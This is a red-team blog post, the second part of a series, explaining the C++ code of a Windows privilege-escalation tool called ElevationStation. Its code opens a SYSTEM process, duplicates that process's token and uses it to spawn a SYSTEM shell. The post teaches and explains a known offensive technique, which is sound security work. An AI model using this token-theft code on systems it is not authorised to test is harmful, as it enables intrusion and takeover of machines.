---
title:  "ElevationStation - A walkthrough through the development process [PART 2]"
categories:
  - privilege escalation
tags:
  - escalation
  - psexec
  - malware
  - red team
  - win32api
  - privesc
  - privilege escalation
  - elevationstation
  - getsystem
  - metasploit
---

Hello again Infosec enthusiasts! Last time we talked, we discussed enabling token privileges for our current process so we can remotely access other processes via the SeDebug privilege. Let's continue on through the code shall we 😃

For review, we are here in the code:
```cpp
int DupProcessToken(DWORD pid)
{
    //enable ALL necessary privs!!!
   ➡️ setProcessPrivs(SE_DEBUG_NAME); ⬅️
    //priv enable routine complete
    BOOL bRet;
```
So we've successfully set our process privileges.  Now, let's steal the `SYSTEM` token we desire from our target process shall we?  To do so, we first need to open the remote process and get a handle on the remote process token.  Interestingly and favourably for us, we can open a remote `SYSTEM` process using the lowest level of desired access permitted, `PROCESS_QUERY_LIMITED_INFORMATION`, like so:
```cpp
proc2 = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!proc2)
    {
        Color(14);
        printf("[!] There was a permissions error opening process: %d w/ requested access...: %d\n", pid, GetLastError());
        Color(7);
        exit(0);
    }

    if (!OpenProcessToken(proc2, MAXIMUM_ALLOWED, &tok2))
    {
        Color(14);
        printf("[!] There was a permissions error applying the requested access to the token: %d\n", GetLastError());
        Color(7);
        exit(0);
    }
  ```
Next, we duplicate the token aquired in our token HANDLE and now we have an exact replica of the `SYSTEM` process token with all it's glorious privileges!
```cpp
if (!DuplicateTokenEx(tok2, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hNewToken))
    {
        Color(14);
        wprintf(L"[!] DuplicateTokenEx failed. Error: %d\n", GetLastError());
        Color(7);
    }
    else
    {
        Color(2);
        printf("[+] DuplicateTokenEx success!!!\n");
        Color(7);
    }
```

`BEFORE` Duplicating Token:
![image](https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/c05126fe-33e9-4709-82b3-7a5c4001f1f5)

and `AFTER` duplicating the token.  Notice a strikingly noteworthy difference? 😸
![image](https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/5698a405-fd3a-4343-bfdc-b7630989a2f2)
![image](https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/2ef7009a-27a4-48c9-985f-57a4797d80c6)

Our `elevationstation.exe` process now **OWNS** a primary token with `SYSTEM` privileges, successfully duplicating the remote `SYSTEM` level process!  Now the moment you have all been waiting for... it's finally time to pop a SYSTEM shell!


```cpp
bRet = CreateProcessWithTokenW(hNewToken, NULL, NULL, wszProcessName, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &StartupInfo, &ProcInfo);

    if (bRet == 0)
    {
        Color(14);
        printf("[!] CreateProcessWithToken didn't cooperate...permissions maybe???\n");
        Color(7);
        printf("Return value: %d\n", GetLastError());
    }
    else
    {
        Color(2);
        printf("[+] CreateProcessWithToken worked!!!\n");
        Color(7);
        printf("Return value: %d\n", bRet);
        fflush(stdout);
        WaitForSingleObject(ProcInfo.hProcess, INFINITE);
    }
    CloseHandle(hNewToken);
    CloseHandle(proc2);
    CloseHandle(tok2);
```
![image](https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/f7733753-d908-4409-a7df-2edb94adb49f)

And there you have it friends.  This concludes part 2 of our series explaining ElevationStation and the code behind how it works.  This portion of the series has only explained stealing primary tokens from a process. Next time, I'll walk you through stealing a remote process impersonation `THREAD` token and "converting" it to a primary token to gain a SYSTEM shell within your current shell, avoiding the headache of having to deal with CreateProcessWithToken's limitations 😆

bye!
